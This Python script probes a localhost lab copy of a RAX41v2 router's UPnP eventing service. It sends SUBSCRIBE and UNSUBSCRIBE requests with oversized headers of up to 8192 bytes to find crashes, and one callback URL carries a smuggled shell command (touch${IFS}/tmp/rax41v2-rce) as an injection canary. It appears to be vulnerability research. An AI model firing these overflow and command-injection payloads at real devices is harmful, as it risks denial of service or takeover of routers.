#!/usr/bin/env python3
"""Bounded eventing probes for the localhost-only RAX41v2 UPnP lab."""

from __future__ import annotations

import socket
import time


HOST = "127.0.0.1"
PORT = 25_341


def exchange(payload: bytes, timeout: float = 3.0) -> bytes:
    output = bytearray()
    with socket.create_connection((HOST, PORT), timeout=timeout) as client:
        client.sendall(payload)
        client.shutdown(socket.SHUT_WR)
        client.settimeout(timeout)
        try:
            while len(output) < 65536:
                chunk = client.recv(4096)
                if not chunk:
                    break
                output.extend(chunk)
        except (TimeoutError, socket.timeout):
            pass
    return bytes(output)


def status(response: bytes) -> str:
    return response.splitlines()[0].decode("iso-8859-1", "replace") if response else "no-response"


def healthy() -> bool:
    try:
        response = exchange(
            b"GET / HTTP/1.0\r\nHost: 10.0.2.15:56688\r\nConnection: close\r\n\r\n"
        )
        return response.startswith(b"HTTP/")
    except OSError:
        return False


def event_request(method: bytes, headers: list[tuple[bytes, bytes]]) -> bytes:
    return (
        method
        + b" /Public_UPNP_Event_1 HTTP/1.1\r\n"
        + b"Host: 10.0.2.15:56688\r\n"
        + b"".join(name + b": " + value + b"\r\n" for name, value in headers)
        + b"Content-Length: 0\r\nConnection: close\r\n\r\n"
    )


def subscribe(callback: bytes) -> bytes:
    return event_request(
        b"SUBSCRIBE",
        [
            (b"CALLBACK", b"<" + callback + b">"),
            (b"NT", b"upnp:event"),
            (b"TIMEOUT", b"Second-1800"),
        ],
    )


def main() -> int:
    callback_prefix = b"http://10.0.2.2/"
    cases = [
        ("control", subscribe(b"http://10.0.2.2:9/event")),
        ("rax30-shape-72", subscribe(callback_prefix + b"F" * (72 - len(callback_prefix)))),
        ("rax30-shape-73", subscribe(callback_prefix + b"F" * (73 - len(callback_prefix)))),
        ("rax30-shape-76", subscribe(callback_prefix + b"F" * (76 - len(callback_prefix)))),
        ("missing-scheme-73", subscribe(b"A" * 73)),
        ("callback-8192", subscribe(callback_prefix + b"A" * (8192 - len(callback_prefix)))),
        (
            "timeout-8192",
            event_request(
                b"SUBSCRIBE",
                [
                    (b"CALLBACK", b"<http://10.0.2.2:9/event>"),
                    (b"NT", b"upnp:event"),
                    (b"TIMEOUT", b"A" * 8192),
                ],
            ),
        ),
        (
            "nt-8192",
            event_request(
                b"SUBSCRIBE",
                [
                    (b"CALLBACK", b"<http://10.0.2.2:9/event>"),
                    (b"NT", b"A" * 8192),
                    (b"TIMEOUT", b"Second-1800"),
                ],
            ),
        ),
        (
            "renewal-sid-8192",
            event_request(
                b"SUBSCRIBE",
                [(b"SID", b"uuid:" + b"A" * 8192), (b"TIMEOUT", b"Second-1800")],
            ),
        ),
        (
            "unsubscribe-sid-8192",
            event_request(b"UNSUBSCRIBE", [(b"SID", b"uuid:" + b"A" * 8192)]),
        ),
        (
            "callback-command-canary",
            subscribe(b"http://10.0.2.2/FRIDAY_RAX41V2;touch${IFS}/tmp/rax41v2-rce"),
        ),
    ]
    if not healthy():
        print("baseline_failed")
        return 2
    for name, payload in cases:
        try:
            result = status(exchange(payload))
        except OSError as error:
            result = f"socket-error:{error}"
        time.sleep(0.4)
        alive = healthy()
        print(f"{name} request_bytes={len(payload)} status={result} alive={alive}")
        if not alive:
            print(f"crash_candidate={name}")
            return 1
    print("result=no-observable-eventing-dos")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
